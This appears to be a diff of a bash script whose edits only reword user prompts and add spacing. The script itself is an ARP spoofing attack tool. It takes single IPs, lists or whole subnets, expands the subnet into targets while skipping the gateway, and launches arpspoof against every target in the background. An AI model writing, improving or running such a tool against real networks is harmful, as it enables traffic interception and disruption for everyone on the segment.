@@ -67,23 +67,27 @@ echo "Select target type:"
 echo "1) Single IP"
 echo "2) Multiple IPs (comma separated)"
 echo "3) Subnet (CIDR notation)"
+echo ""
 read -p "Enter choice [1-3]: " target_type
-
+echo ""
 case $target_type in
     1)
-        read -p "Enter target IP: " TARGET
+        echo "Enter target IP: e.g 192.168.1.123"
+        read -p "> " TARGET
         TARGETS=($TARGET)
         ;;
     2)
-        read -p "Enter target IPs (comma separated): " target_input
+        echo "Enter Multiple IP's: e.g 192.168.1.123,192.168.1.124"
+        read -p "> " target_input
         IFS=',' read -ra TARGETS <<< "$target_input"
         ;;
     3)
-        read -p "Enter subnet (CIDR notation, e.g., 192.168.1.0/24): " subnet
+        echo "Enter Subnet Mask: e.g 192.168.1.1/24"
+        read -p "> " subnet
 
-        # Validate subnet format
+        # Validate subnet
         if ! ipcalc -n "$subnet" &>/dev/null; then
-            echo "Invalid subnet format. Please use CIDR notation (e.g., 192.168.1.0/24)"
+            echo "Invalid subnet format. Please use CIDR notation e.g 192.168.1.1/24"
             exit 1
         fi
 
@@ -95,10 +99,6 @@ case $target_type in
         FIRST_HOST=$(echo "$NETWORK_INFO" | grep 'HostMin:' | awk '{print $2}')
         LAST_HOST=$(echo "$NETWORK_INFO" | grep 'HostMax:' | awk '{print $2}')
 
-        echo "Network: $NETWORK_ADDR"
-        echo "Netmask: $NETMASK"
-        echo "Broadcast: $BROADCAST"
-        echo "Host range: $FIRST_HOST - $LAST_HOST"
 
         # Generate all IPs in range except gateway and our IP
         IFS=. read -r i1 i2 i3 i4 <<< "$FIRST_HOST"
@@ -124,12 +124,16 @@ case $target_type in
             exit 1
         fi
 
-        echo "Found ${#TARGETS[@]} potential targets in subnet"
+       echo ""
+       echo "Found ${#TARGETS[@]} potential targets in subnet"
 
         # Option to exempt additional IPs
+        echo ""
         read -p "Do you want to exempt any additional IPs from the subnet? (y/n) " exempt_choice
         if [[ "$exempt_choice" =~ ^[Yy]$ ]]; then
-            read -p "Enter IPs to exempt (comma separated): " exempt_input
+            echo ""
+            echo "Enter IP's to exempt: e.g 192.168.1.110,192.168.1.120"
+            read -p "> " exempt_input
             IFS=',' read -ra EXEMPTS <<< "$exempt_input"
 
             # Remove exempt IPs from targets
@@ -146,6 +150,7 @@ case $target_type in
             done
             TARGETS=("${NEW_TARGETS[@]}")
 
+            echo ""
             echo "Updated targets after exemption: ${#TARGETS[@]} remaining"
         fi
         ;;
@@ -162,6 +167,7 @@ fi
 
 # Confirm before proceeding
 echo -e "\nNumber of targets to affect: ${#TARGETS[@]}"
+echo ""
 read -p "Are you sure you want to continue? (y/n) " confirm
 if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
     echo "Aborted."
@@ -171,6 +177,7 @@ fi
 # Start ARP spoofing for each target
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
+    echo ""
     echo "Starting ARP spoofing for $TARGET"
     arpspoof -i $INTERFACE -t $TARGET $GATEWAY >/dev/null 2>&1 &
     PIDS+=($!)
